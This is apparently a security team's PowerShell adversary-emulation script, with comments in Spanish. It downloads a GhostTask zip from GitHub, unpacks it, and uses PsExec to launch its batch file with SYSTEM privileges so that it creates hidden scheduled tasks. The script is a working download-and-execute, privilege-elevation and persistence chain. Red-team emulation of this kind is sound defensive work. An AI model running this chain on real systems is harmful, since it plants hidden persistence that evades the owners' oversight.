# Configuración inicial
try {
    $Host.UI.RawUI.BackgroundColor = "Black"
    Clear-Host
    Write-Host "[CSIRT FINANCIERO AHIBA: Iniciando emulación de la técnica HiddenTask]" -ForegroundColor Green  
    Write-Host "[Actividad 01. Ejecución de artefacto GhostTask para la creación de tareas programadas ocultas.]" -ForegroundColor Green
}
catch {
    Write-Host "[X] Error general: $_" -ForegroundColor Red
    exit 1
}

# Obtener la ruta del directorio del usuario actual
try {
    $directorioTemporal = $env:HOMEPATH
    Write-Host " "
    Write-Host "[+] Se obtiene la ruta del directorio del usuario actual." -ForegroundColor Green 
}
catch {
    Write-Host "[!] Error al obtener la ruta del directorio del usuario actual: $_" -ForegroundColor Red
    Start-Sleep -Seconds 5
    Write-Host "[*] Presiona cualquier tecla para cerrar PowerShell" -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Crear el directorio donde se van a descargar los archivos necesarios para ejecutar las acciones maliciosas
try {
    Write-Host " "
    Write-Host "[+] Creando directorio..." -ForegroundColor Yellow
    Start-Sleep -s 1.5
    $workingPath = "HiddenTask"
    $nuevaRuta = Join-Path -Path $directorioTemporal -ChildPath $workingPath

    if (Test-Path -Path $nuevaRuta) {
        Write-Host "[!] El directorio ya existe. Eliminando..." -ForegroundColor Yellow
        Remove-Item -Path $nuevaRuta -Recurse -Force
    }
    New-Item -ItemType Directory -Path $nuevaRuta -ErrorAction Stop | Out-Null
    Write-Host "[✓] Directorio creado exitosamente." -ForegroundColor Cyan
}
catch {
    Write-Host "[!] Error al crear el directorio." -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para cerrar PowerShell" -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Descargar el archivo de GitHub
try {
    $urlArchivoMal = "https://github.com/Reapaerraziel/Emulation_HiddenTask/raw/main/Test_HiddenTask-main/HiddenTask%20with%20GhostTask/GhostTask.zip"
    $fileName = "GhostTask.zip"
    $rutaArchivo = Join-Path -Path $nuevaRuta -ChildPath $fileName
    Start-Sleep -s 1
    Write-Host " "
    Write-Host "[+] Descargando archivos necesarios para la ejecución..." -ForegroundColor Yellow
    Write-Host " "
    Invoke-WebRequest -Uri $urlArchivoMal -OutFile $rutaArchivo
    Start-Sleep -s 1
    Write-Host "[✓] Descarga de archivo correcta." -ForegroundColor Cyan
    Write-Host " "
}
catch {
    Write-Host "[!] Error al descargar el archivo: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Descomprimir el archivo
try {
    $rutaDescompresion = Join-Path -Path $nuevaRuta -ChildPath "Descomprimido"
    Expand-Archive -Path $rutaArchivo -DestinationPath $rutaDescompresion -ErrorAction Stop
    Start-Sleep -s 1
    Write-Host "[+] Descomprimiendo el archivo..." -ForegroundColor Yellow 
    Write-Host "[✓] Archivo descomprimido exitosamente." -ForegroundColor Cyan
    Write-Host " "
}
catch {
    Write-Host "[!] Error al descomprimir el archivo: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask
try {
    $psExec = Join-Path -Path $rutaDescompresion -ChildPath "PsExec.exe"
    $batExec = Join-Path -Path $rutaDescompresion -ChildPath "launch.bat"
    Start-Sleep -s 1
    Write-Host "[+] Elevando privilegios con PsExec..." -ForegroundColor Yellow
    Start-Sleep -s 1
    Write-Host "[+] Ejecutando lanzador de GhostTask..." -ForegroundColor Yellow
    Start-Process -FilePath $psExec -ArgumentList "-accepteula", "-i", "-s", $batExec -Verb "runas"
    Write-Host " "
    Write-Host "[✓] Proceso iniciado con privilegios elevados." -ForegroundColor Cyan
    Write-Host "[*] Presiona cualquier tecla para cerrar PowerShell" -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
catch {
    Write-Host "[!] Error al elevar privilegios o ejecutar GhostTask: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
